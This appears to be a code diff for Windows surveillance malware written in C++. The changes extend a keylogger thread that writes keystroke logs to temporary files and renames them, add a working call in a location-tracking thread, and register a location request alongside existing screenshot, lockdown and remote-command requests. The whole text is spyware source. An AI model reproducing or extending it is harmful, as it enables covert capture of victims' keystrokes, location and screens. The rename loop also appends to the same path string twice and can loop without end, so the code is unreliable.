@@ -23,10 +23,21 @@ DWORD WINAPI initKeylogger(LPVOID lpParam)
 			continue;
 		}
 		// Filename changes every { num_seconds } declared in the keylogger.cpp file 
-		wstring filename = stringToWString(constructFilename(KEYLOG_CODE));
-	
+
+		string filename = constructFilename(TEMP_CODE);
+		wstring filenameW = stringToWString(filename);
+
 		// Start keylogger
-		keylogger(filename.c_str());
+		keylogger(filenameW.c_str());
+
+		string finalFilename = constructFilename(KEYLOG_CODE);
+		wstring finalFilenameW = stringToWString(finalFilename);
+		string path = DATA_FOLDER_PATH;
+
+		int res = -1;
+		do 
+			res = rename(path.append(filename).c_str(), path.append(finalFilename).c_str());
+		while (res != 0);
 
 		// Notifiy data manager thread
 		SetEvent(newDataEvent);
@@ -161,10 +172,9 @@ DWORD WINAPI initLocationTracker(LPVOID lpParam) {
 
 		wstring filename = stringToWString(constructFilename(LOCATION_CODE));
 
-
+		getLocation(filename.c_str());
 		SetEvent(newDataEvent);
 	}
-
 	return 0;
 }
 
@@ -252,6 +262,7 @@ DWORD WINAPI initRequestManager(LPVOID lpParam)
 			initRequest(allRequests, Screenshot, screenRequest);
 			initRequest(allRequests, Lockdown, lockRequest);
 			initRequest(allRequests, Command, cmdRequest);
+			initRequest(allRequests, Location, locationRequest);
 		}
 		Sleep(SYNC_TIME);
 	}
@@ -323,7 +334,6 @@ string getRandomString(const int len) {
 	}
 	return tmp_s;
 }
-
 
 string constructFilename(const char* typeCode) {
 	// Get time and date
